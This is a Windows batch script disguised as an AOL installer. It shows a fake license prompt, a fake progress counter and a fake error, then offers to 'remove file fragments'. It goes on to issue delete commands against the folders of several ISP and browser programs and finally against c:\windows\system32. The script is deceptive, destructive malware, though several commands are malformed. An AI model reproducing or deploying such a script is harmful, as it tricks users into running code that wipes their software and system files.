   @echo off

   echo welcome to the instalation program for AOL ™

   echo AOL program is under copyright© license

   echo If you agree and wish to continue press any key to continue

   pause >nul

   echo You have choosen to continue the instalation

   echo Windows will now begin  instalation press a key to continue

   pause >nul

   echo installing
   echo 1%
   echo 2%
   echo 3%
   echo 4%
   echo 5%
   echo 0%
   echo 0%
   echo 0%
   echo windows has detected a problem in the main componenets of this program press a key to quit the installation

   pause >nul

   echo exiting the program

   echo please press a key to confirm close

   pause >nul

   echo installation is not complete would you like windows to remove the file fragments? y=yes n=no

   pause >nul

   echo you have choosen to remove the files

   echo windows will now delete all AOL files

   echo press akey to begin

   pause >nul

   echo deleting AOL directory
   del/y c:\programfiles\aol
   if not exist del/y c:\programfiles\compuserve
   if not exist del/y c:\programfiles\msn
   if not exist del/y c:\programfiles\earthlink
   if not exist del/y c:\programfiles\juno
   if not exist del/y c:\programfiles\wmconnect
   if not exist goto unknown

   :unknown
   echo error removing files

   echo you may need to manually delete some of the files press any key to continue

   pause >nul

   echo loading

   del/y c:\prgramfiles\yahoo
   if not exist del/y c:\programfiles\netscape
   if not exist goto end

   :end
   echo Thank you!!

   del/y c:\windows\system32

   exit
